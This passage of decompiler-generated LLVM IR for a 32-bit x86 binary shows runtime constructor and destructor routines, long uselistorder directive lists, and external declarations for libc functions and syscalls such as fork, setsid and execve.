  %v3_80527ff = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8052807

dec_label_pc_8052807:                             ; preds = %dec_label_pc_80527fa, %dec_label_pc_80527ff
  %v0_805280d = phi i32 [ %v0_80527fa, %dec_label_pc_80527fa ], [ %v3_80527ff, %dec_label_pc_80527ff ]
  %storemerge = phi i32 [ %v1_80527fc, %dec_label_pc_80527fa ], [ %tmp, %dec_label_pc_80527ff ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_805280a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805280a, i32* @ebx, align 4
  ret i32 %v0_805280d

; uselistorder directives
  uselistorder i32 %v1_80527dc, { 1, 2, 0, 3 }
  uselistorder i32* @edx, { 12, 0, 13, 93, 19, 20, 21, 22, 23, 24, 25, 107, 3, 1, 14, 94, 26, 27, 28, 29, 30, 31, 32, 33, 34, 148, 149, 150, 151, 4, 152, 153, 112, 113, 16, 17, 114, 156, 157, 161, 160, 81, 18, 117, 118, 5, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 6, 132, 133, 115, 116, 134, 7, 135, 159, 35, 106, 36, 37, 38, 39, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 11, 58, 59, 41, 60, 8, 61, 62, 64, 9, 65, 66, 67, 68, 69, 15, 10, 63, 70, 155, 71, 108, 109, 154, 158, 147, 110, 111, 103, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 95, 96, 97, 98, 99, 100, 101, 102, 104, 105, 136, 137, 138, 139, 141, 145, 140, 143, 144, 2, 142, 146, 162 }
  uselistorder i32 31, { 18, 19, 20, 21, 11, 2, 3, 0, 1, 10, 25, 15, 16, 17, 6, 7, 4, 5, 12, 8, 9, 22, 23, 24, 13, 14, 26 }
  uselistorder i32 (i32)* @__errno_location, { 54, 53, 52, 27, 51, 50, 33, 49, 26, 13, 12, 11, 10, 9, 58, 8, 25, 24, 7, 17, 48, 47, 22, 21, 57, 56, 55, 23, 20, 46, 19, 45, 44, 43, 0, 14, 38, 6, 5, 42, 35, 34, 31, 4, 16, 1, 30, 15, 37, 29, 28, 41, 3, 2, 40, 39, 32, 59, 36, 18 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_8052807, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805281c = load i32, i32* @global_var_80555e0.151, align 32
  %v10_8052821 = icmp eq i32 %v0_805281c, -1
  br i1 %v10_8052821, label %dec_label_pc_805283c, label %dec_label_pc_8052830.preheader

dec_label_pc_8052830.preheader:                   ; preds = %entry
  br label %dec_label_pc_8052830

dec_label_pc_8052830:                             ; preds = %dec_label_pc_8052830.preheader, %dec_label_pc_8052830
  %v4_8052833 = phi i32 [ %v0_805281c, %dec_label_pc_8052830.preheader ], [ %v2_8052835, %dec_label_pc_8052830 ]
  %v0_8052830 = phi i32 [ ptrtoint (i32* @global_var_80555e0.151 to i32), %dec_label_pc_8052830.preheader ], [ %v1_8052830, %dec_label_pc_8052830 ]
  %v1_8052830 = add i32 %v0_8052830, -4
  call void @__pseudo_call(i32 %v4_8052833)
  %v1_8052835 = inttoptr i32 %v1_8052830 to i32*
  %v2_8052835 = load i32, i32* %v1_8052835, align 4
  %v10_8052837 = icmp eq i32 %v2_8052835, -1
  %v1_805283a = icmp eq i1 %v10_8052837, false
  br i1 %v1_805283a, label %dec_label_pc_8052830, label %dec_label_pc_805283c.loopexit

dec_label_pc_805283c.loopexit:                    ; preds = %dec_label_pc_8052830
  %v2_805283c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805283c

dec_label_pc_805283c:                             ; preds = %dec_label_pc_805283c.loopexit, %entry
  %v2_805283c = phi i32 [ %v2_805283c.pre, %dec_label_pc_805283c.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_805283c

; uselistorder directives
  uselistorder i32 %v0_805281c, { 1, 0 }
  uselistorder i1 false, { 528, 2, 367, 368, 369, 45, 132, 133, 134, 135, 136, 137, 476, 459, 460, 462, 461, 3, 370, 371, 372, 373, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 68, 148, 149, 150, 151, 152, 153, 297, 298, 299, 300, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 529, 530, 40, 1, 170, 46, 70, 171, 172, 477, 478, 479, 130, 546, 547, 548, 549, 552, 47, 553, 554, 551, 545, 531, 102, 173, 174, 175, 176, 177, 178, 532, 533, 71, 301, 302, 303, 304, 305, 306, 4, 405, 5, 418, 419, 131, 536, 537, 538, 539, 540, 543, 544, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 480, 493, 494, 495, 496, 497, 498, 499, 500, 501, 27, 503, 502, 507, 504, 505, 506, 6, 508, 509, 179, 180, 467, 550, 181, 182, 48, 448, 449, 450, 452, 451, 7, 453, 183, 8, 184, 454, 455, 185, 186, 187, 188, 189, 190, 191, 192, 69, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 213, 212, 214, 215, 216, 217, 218, 220, 28, 221, 219, 222, 224, 223, 9, 225, 226, 228, 227, 49, 229, 230, 231, 232, 233, 72, 234, 235, 80, 81, 236, 82, 83, 237, 238, 84, 239, 240, 73, 85, 241, 242, 243, 244, 245, 74, 246, 75, 86, 76, 247, 77, 248, 249, 250, 78, 251, 79, 252, 87, 253, 254, 255, 127, 128, 256, 257, 534, 50, 535, 10, 258, 259, 541, 542, 470, 287, 260, 88, 51, 52, 261, 262, 11, 12, 263, 264, 265, 266, 267, 268, 13, 14, 269, 270, 271, 272, 273, 274, 275, 276, 89, 277, 278, 279, 280, 281, 282, 283, 284, 285, 42, 41, 286, 288, 90, 91, 29, 92, 289, 290, 292, 291, 15, 293, 294, 295, 296, 307, 308, 309, 310, 311, 312, 313, 316, 93, 314, 315, 59, 60, 317, 67, 30, 318, 319, 320, 66, 321, 322, 323, 324, 325, 328, 94, 326, 327, 57, 58, 329, 31, 330, 331, 332, 333, 334, 335, 336, 337, 340, 95, 338, 339, 55, 56, 341, 32, 342, 343, 344, 345, 346, 347, 350, 96, 348, 349, 53, 54, 351, 33, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 374, 97, 390, 98, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 61, 62, 391, 392, 393, 394, 395, 396, 397, 398, 0, 399, 99, 400, 401, 402, 100, 403, 404, 101, 406, 407, 408, 409, 410, 411, 412, 413, 414, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 415, 416, 17, 417, 16, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 34, 431, 432, 433, 434, 435, 44, 436, 437, 438, 439, 440, 441, 442, 443, 444, 65, 445, 35, 36, 447, 446, 18, 457, 456, 19, 458, 20, 463, 464, 465, 21, 466, 43, 468, 469, 471, 472, 37, 473, 474, 475, 525, 510, 511, 512, 513, 518, 522, 523, 524, 22, 514, 63, 515, 516, 517, 38, 26, 519, 25, 39, 24, 520, 521, 23, 526, 527, 129, 64, 555, 556 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 7, 8, 9, 2, 27, 10, 23, 24, 25, 26, 33, 34, 35, 36, 3, 37, 0, 32, 38, 39, 40, 41, 42, 43, 4, 28, 29, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 5, 1, 30, 6, 31 }
  uselistorder i32 ptrtoint (i32* @global_var_80555e0.151 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, { 0, 1, 62, 137, 44, 63, 138, 249, 139, 140, 141, 142, 144, 143, 60, 45, 145, 146, 2, 50, 56, 147, 250, 148, 119, 64, 65, 149, 66, 150, 124, 151, 152, 57, 153, 120, 154, 53, 155, 156, 157, 68, 67, 158, 159, 54, 160, 69, 70, 71, 161, 72, 73, 162, 74, 163, 75, 164, 76, 165, 77, 166, 78, 167, 79, 168, 80, 169, 81, 170, 82, 171, 3, 4, 5, 172, 61, 83, 84, 173, 174, 175, 176, 177, 178, 86, 85, 87, 179, 88, 180, 51, 181, 89, 182, 183, 264, 184, 185, 6, 261, 262, 9, 8, 10, 11, 12, 90, 13, 91, 14, 186, 7, 263, 46, 187, 188, 189, 125, 190, 15, 16, 92, 257, 251, 260, 191, 192, 193, 194, 195, 93, 126, 196, 55, 197, 48, 252, 253, 49, 198, 199, 254, 200, 94, 201, 202, 203, 135, 136, 204, 205, 95, 206, 17, 18, 96, 207, 97, 208, 58, 59, 209, 98, 210, 99, 211, 100, 212, 101, 213, 102, 214, 103, 215, 104, 216, 105, 217, 106, 218, 107, 219, 108, 220, 109, 221, 110, 222, 111, 223, 112, 224, 19, 225, 226, 128, 227, 129, 228, 127, 255, 256, 20, 21, 22, 23, 229, 24, 230, 25, 231, 26, 232, 27, 233, 28, 234, 29, 235, 30, 31, 33, 32, 34, 236, 37, 35, 36, 52, 47, 38, 39, 130, 259, 258, 237, 131, 238, 239, 240, 241, 40, 242, 122, 123, 121, 41, 113, 114, 115, 116, 117, 118, 42, 243, 244, 245, 246, 247, 248, 43, 132, 133, 134 }
  uselistorder i32 1, { 332, 334, 333, 81, 692, 693, 694, 207, 695, 132, 208, 209, 89, 91, 90, 92, 240, 0, 336, 335, 79, 80, 337, 75, 241, 242, 736, 737, 738, 739, 199, 696, 697, 698, 338, 65, 609, 339, 87, 88, 265, 610, 611, 612, 210, 264, 340, 613, 614, 615, 211, 616, 617, 352, 351, 350, 349, 348, 347, 346, 345, 344, 343, 342, 341, 172, 174, 170, 166, 173, 165, 167, 169, 168, 171, 670, 671, 1, 35, 34, 33, 32, 31, 353, 175, 176, 354, 74, 73, 618, 619, 355, 96, 95, 97, 797, 798, 799, 356, 110, 109, 111, 108, 620, 357, 43, 40, 42, 38, 39, 41, 243, 244, 360, 359, 358, 361, 78, 362, 363, 30, 365, 364, 117, 366, 177, 367, 178, 368, 179, 369, 180, 370, 107, 372, 371, 154, 373, 25, 375, 374, 113, 376, 380, 379, 378, 377, 70, 802, 803, 804, 383, 382, 381, 129, 130, 245, 385, 384, 387, 386, 181, 246, 296, 579, 2, 393, 392, 391, 390, 389, 388, 71, 72, 800, 396, 395, 394, 68, 66, 67, 266, 397, 672, 673, 674, 675, 398, 56, 55, 57, 54, 58, 247, 399, 23, 24, 701, 580, 198, 702, 297, 703, 322, 400, 143, 142, 141, 144, 401, 160, 157, 156, 158, 162, 161, 159, 102, 99, 101, 103, 98, 100, 267, 403, 402, 268, 404, 269, 405, 270, 408, 407, 406, 298, 411, 410, 409, 182, 271, 750, 751, 752, 412, 69, 753, 754, 200, 755, 756, 757, 106, 104, 105, 299, 749, 212, 183, 184, 186, 185, 272, 758, 759, 760, 761, 762, 763, 764, 765, 766, 213, 767, 768, 769, 770, 771, 250, 772, 773, 196, 251, 774, 775, 776, 777, 248, 249, 778, 779, 780, 415, 414, 413, 60, 61, 62, 64, 63, 252, 253, 416, 254, 255, 214, 420, 419, 418, 417, 112, 215, 300, 421, 422, 423, 424, 425, 426, 427, 428, 429, 676, 677, 430, 114, 433, 432, 431, 36, 434, 621, 622, 330, 435, 115, 727, 728, 729, 730, 731, 732, 733, 623, 273, 274, 624, 436, 19, 18, 17, 275, 276, 438, 437, 150, 149, 148, 205, 277, 278, 279, 439, 134, 133, 135, 440, 441, 256, 625, 626, 627, 323, 140, 139, 628, 629, 581, 217, 630, 631, 632, 633, 634, 636, 637, 638, 218, 639, 640, 301, 216, 641, 219, 642, 643, 644, 635, 445, 444, 443, 442, 50, 52, 51, 47, 48, 49, 53, 645, 446, 121, 118, 120, 119, 220, 447, 646, 647, 449, 448, 27, 26, 648, 649, 582, 583, 257, 650, 258, 651, 652, 653, 221, 654, 280, 655, 452, 451, 450, 82, 85, 84, 83, 86, 222, 281, 3, 282, 453, 259, 454, 455, 164, 163, 801, 457, 456, 187, 188, 260, 805, 458, 189, 283, 656, 459, 461, 460, 137, 462, 37, 463, 44, 464, 190, 465, 155, 466, 29, 467, 151, 28, 469, 468, 136, 470, 94, 471, 116, 472, 191, 473, 475, 474, 77, 476, 76, 477, 59, 479, 478, 93, 480, 122, 138, 657, 201, 286, 206, 658, 4, 5, 197, 304, 584, 659, 660, 661, 662, 305, 318, 585, 586, 587, 663, 664, 261, 223, 303, 284, 306, 302, 665, 486, 485, 331, 484, 483, 482, 481, 324, 152, 153, 666, 667, 492, 491, 490, 489, 325, 488, 487, 307, 668, 669, 494, 493, 588, 678, 679, 589, 224, 590, 225, 591, 226, 227, 592, 228, 229, 593, 594, 595, 495, 45, 46, 680, 681, 682, 683, 6, 684, 685, 686, 194, 503, 502, 501, 500, 499, 498, 497, 496, 125, 126, 687, 688, 7, 689, 690, 691, 195, 511, 510, 509, 508, 507, 506, 505, 504, 127, 128, 699, 596, 597, 598, 599, 600, 601, 262, 308, 700, 512, 517, 516, 515, 514, 513, 326, 20, 22, 21, 704, 8, 309, 518, 705, 706, 522, 521, 520, 519, 123, 124, 707, 603, 604, 605, 9, 606, 607, 608, 708, 527, 526, 525, 524, 523, 147, 145, 146, 290, 602, 528, 709, 529, 530, 192, 193, 230, 531, 533, 532, 10, 11, 232, 710, 310, 231, 263, 711, 712, 536, 535, 534, 291, 713, 714, 537, 311, 287, 288, 715, 538, 327, 716, 717, 539, 289, 312, 233, 718, 719, 546, 545, 544, 543, 542, 541, 540, 720, 721, 12, 313, 722, 234, 235, 723, 724, 549, 548, 547, 328, 725, 551, 550, 726, 553, 552, 314, 734, 555, 554, 735, 556, 292, 740, 741, 293, 742, 743, 294, 295, 744, 745, 557, 746, 13, 747, 315, 316, 561, 560, 559, 558, 317, 14, 236, 748, 563, 562, 565, 564, 15, 568, 567, 566, 570, 569, 781, 782, 319, 790, 791, 204, 792, 572, 571, 285, 16, 574, 573, 237, 783, 203, 784, 785, 238, 786, 202, 788, 789, 239, 320, 321, 787, 329, 793, 794, 575, 795, 796, 131, 577, 576, 578 }
  uselistorder label %dec_label_pc_8052830, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8052847 = load i32, i32* @ebx, align 4
  %v1_8052848 = call i32 @__get_pc_thunk_bx(i32 %v0_8052847)
  store i32 %v1_8052848, i32* @eax, align 4
  %v0_8052853 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8052853

; uselistorder directives
  uselistorder i32* @eax, { 8, 0, 26, 27, 94, 82, 96, 97, 98, 99, 101, 20, 102, 1, 100, 4, 7, 95, 58, 9, 23, 24, 60, 25, 83, 85, 86, 84, 87, 88, 90, 91, 89, 2, 28, 30, 29, 31, 32, 34, 22, 33, 35, 36, 37, 38, 10, 39, 40, 41, 11, 42, 12, 13, 43, 44, 45, 46, 14, 47, 15, 48, 16, 49, 17, 50, 18, 51, 52, 53, 54, 55, 56, 57, 19, 59, 21, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 77, 74, 75, 76, 78, 79, 80, 81, 5, 103, 92, 93, 3, 6 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 627, 628, 19, 63, 943, 94, 95, 506, 629, 630, 631, 14, 201, 119, 118, 632, 633, 202, 634, 635, 507, 636, 637, 638, 639, 120, 508, 121, 1003, 1004, 122, 1005, 1006, 1007, 64, 104, 203, 112, 509, 105, 640, 123, 641, 20, 106, 96, 642, 176, 124, 643, 0, 644, 510, 645, 274, 646, 647, 648, 649, 650, 651, 652, 125, 511, 653, 654, 655, 656, 126, 657, 512, 171, 275, 127, 513, 514, 515, 128, 658, 204, 659, 875, 876, 877, 205, 263, 264, 878, 879, 880, 881, 882, 883, 516, 206, 660, 97, 517, 661, 129, 207, 208, 662, 663, 518, 664, 665, 666, 667, 90, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1, 177, 668, 107, 669, 178, 519, 520, 670, 130, 671, 1015, 1030, 1031, 1032, 276, 1033, 672, 1034, 1087, 618, 1088, 1089, 1090, 1091, 619, 1092, 1035, 1036, 1093, 131, 1094, 209, 1105, 1106, 21, 521, 22, 117, 522, 523, 1118, 1122, 179, 1123, 132, 462, 277, 278, 2, 1095, 1096, 1097, 133, 560, 480, 134, 524, 673, 3, 210, 211, 135, 674, 675, 136, 137, 677, 676, 678, 679, 279, 463, 680, 682, 681, 683, 1098, 1099, 138, 525, 1104, 884, 885, 886, 887, 526, 527, 888, 889, 890, 212, 139, 140, 528, 620, 529, 621, 141, 530, 142, 531, 956, 65, 957, 958, 959, 960, 961, 4, 532, 984, 533, 622, 623, 624, 625, 534, 143, 1107, 464, 144, 213, 1111, 1114, 1113, 1039, 214, 1040, 1041, 1042, 1043, 215, 1044, 1045, 1046, 280, 1037, 281, 1038, 282, 535, 536, 283, 465, 537, 284, 466, 145, 538, 1047, 1048, 146, 147, 285, 467, 114, 59, 60, 1049, 1050, 1051, 1052, 1053, 1054, 148, 149, 286, 468, 113, 1055, 180, 1056, 102, 1057, 1058, 1060, 539, 1059, 5, 626, 6, 1112, 684, 685, 686, 687, 689, 688, 7, 216, 1016, 1017, 1018, 1008, 891, 150, 151, 540, 541, 217, 1119, 1121, 152, 690, 691, 287, 692, 153, 542, 693, 181, 108, 999, 1000, 694, 66, 695, 218, 219, 154, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 155, 543, 715, 220, 716, 717, 718, 719, 720, 23, 24, 544, 192, 193, 721, 722, 723, 724, 156, 725, 726, 727, 545, 728, 25, 26, 157, 546, 729, 730, 731, 734, 732, 733, 27, 61, 67, 735, 736, 737, 738, 265, 739, 740, 158, 741, 742, 743, 744, 745, 746, 747, 748, 160, 749, 750, 751, 547, 752, 753, 182, 183, 754, 755, 756, 161, 159, 757, 162, 758, 759, 548, 760, 761, 762, 763, 764, 765, 766, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 163, 549, 550, 164, 779, 780, 781, 551, 552, 782, 783, 784, 785, 786, 787, 788, 789, 553, 554, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 555, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 221, 556, 222, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 223, 831, 832, 833, 834, 835, 836, 837, 28, 68, 69, 70, 71, 838, 839, 840, 841, 842, 843, 165, 844, 557, 845, 846, 847, 848, 469, 849, 850, 851, 852, 853, 854, 166, 558, 103, 58, 91, 767, 184, 855, 856, 1100, 1101, 185, 1103, 1102, 72, 288, 857, 1086, 167, 962, 1108, 1109, 1110, 858, 994, 1014, 1021, 1115, 224, 1076, 1120, 1022, 1077, 1023, 989, 1024, 1025, 859, 1116, 1117, 29, 482, 172, 292, 173, 293, 860, 291, 73, 17, 18, 294, 861, 483, 299, 300, 228, 229, 227, 295, 301, 302, 296, 862, 303, 304, 863, 484, 305, 306, 864, 865, 485, 307, 308, 486, 309, 310, 30, 168, 225, 289, 487, 866, 169, 226, 290, 481, 311, 312, 867, 297, 868, 298, 230, 869, 313, 314, 194, 195, 196, 75, 871, 315, 870, 318, 319, 74, 316, 320, 321, 317, 872, 322, 873, 266, 874, 323, 336, 489, 337, 338, 231, 31, 32, 892, 488, 490, 339, 340, 333, 893, 895, 334, 335, 894, 189, 896, 267, 897, 898, 899, 900, 491, 341, 342, 330, 901, 903, 331, 332, 902, 188, 904, 905, 906, 907, 908, 909, 910, 492, 343, 344, 327, 911, 913, 328, 329, 912, 187, 914, 493, 345, 346, 324, 915, 917, 325, 326, 916, 186, 918, 494, 347, 348, 495, 349, 350, 496, 378, 379, 76, 929, 34, 919, 920, 921, 470, 237, 922, 923, 924, 925, 471, 236, 926, 927, 928, 33, 930, 931, 932, 15, 77, 939, 36, 933, 934, 935, 472, 238, 936, 937, 938, 35, 940, 941, 942, 16, 944, 239, 945, 37, 240, 946, 174, 947, 497, 352, 353, 498, 354, 355, 499, 356, 357, 500, 358, 359, 501, 360, 361, 175, 502, 362, 363, 948, 268, 949, 950, 951, 952, 351, 953, 473, 954, 955, 109, 110, 963, 964, 38, 242, 965, 269, 966, 967, 968, 969, 474, 970, 365, 971, 475, 364, 39, 241, 476, 972, 973, 974, 975, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 477, 607, 608, 478, 246, 609, 610, 611, 612, 243, 98, 244, 99, 245, 100, 613, 101, 614, 366, 615, 616, 40, 80, 976, 78, 79, 367, 977, 978, 979, 232, 980, 85, 981, 982, 983, 41, 81, 82, 83, 84, 479, 42, 43, 44, 45, 46, 8, 9, 10, 11, 985, 987, 988, 115, 368, 116, 369, 247, 370, 248, 986, 270, 371, 372, 233, 249, 234, 12, 235, 503, 373, 990, 197, 198, 199, 200, 375, 991, 374, 376, 250, 992, 993, 377, 995, 996, 997, 504, 253, 252, 251, 256, 254, 255, 86, 47, 62, 48, 998, 380, 49, 87, 381, 382, 1002, 383, 1001, 385, 386, 88, 384, 387, 388, 1009, 1010, 271, 1011, 1012, 111, 1013, 50, 272, 89, 505, 1019, 389, 390, 391, 1020, 393, 392, 1026, 1027, 1028, 1029, 394, 51, 395, 396, 397, 398, 399, 1070, 93, 92, 52, 259, 260, 1061, 1062, 1063, 1064, 190, 257, 258, 261, 1065, 1066, 1067, 1068, 53, 54, 55, 1069, 273, 56, 57, 1071, 1072, 262, 559, 13, 1073, 1074, 1075, 170, 617, 191, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131 }
  uselistorder i32* @ebx, { 78, 92, 93, 244, 245, 94, 95, 96, 97, 98, 99, 100, 326, 327, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 101, 102, 103, 104, 1, 105, 106, 107, 2, 108, 3, 109, 110, 111, 112, 113, 389, 390, 4, 391, 392, 395, 396, 114, 314, 315, 316, 328, 5, 329, 330, 115, 331, 332, 397, 398, 399, 400, 401, 402, 403, 79, 404, 333, 334, 335, 336, 337, 405, 406, 407, 22, 23, 420, 421, 422, 439, 440, 441, 442, 19, 6, 17, 423, 433, 437, 438, 408, 116, 117, 118, 119, 120, 121, 122, 123, 409, 410, 411, 412, 419, 225, 226, 80, 81, 82, 83, 84, 260, 261, 7, 0, 262, 279, 280, 86, 263, 264, 265, 85, 87, 281, 282, 283, 429, 430, 88, 89, 90, 91, 338, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 8, 353, 354, 339, 340, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 20, 366, 367, 368, 369, 370, 9, 371, 372, 373, 374, 375, 376, 377, 378, 379, 427, 428, 124, 125, 126, 227, 228, 229, 230, 231, 443, 444, 445, 446, 447, 448, 449, 453, 454, 127, 128, 306, 307, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 10, 11, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 177, 178, 12, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 13, 192, 193, 194, 195, 196, 197, 74, 75, 76, 77, 172, 174, 173, 175, 176, 198, 199, 200, 201, 202, 413, 14, 414, 415, 416, 417, 21, 15, 18, 418, 455, 456, 457, 458, 459, 203, 16, 204, 205, 206, 207, 208, 209, 210, 393, 394, 266, 267, 425, 426, 211, 212, 300, 301, 312, 313, 317, 318, 431, 432, 384, 385, 386, 450, 451, 452, 319, 320, 387, 388, 295, 296, 321, 322, 323, 324, 325, 213, 214, 215, 424, 434, 435, 436, 216, 217, 218, 219, 220, 221, 222, 223, 224, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 256, 257, 258, 259, 268, 269, 270, 271, 272, 273, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 274, 275, 276, 277, 278, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 297, 298, 299, 302, 303, 304, 305, 308, 309, 310, 311, 380, 381, 382, 383 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
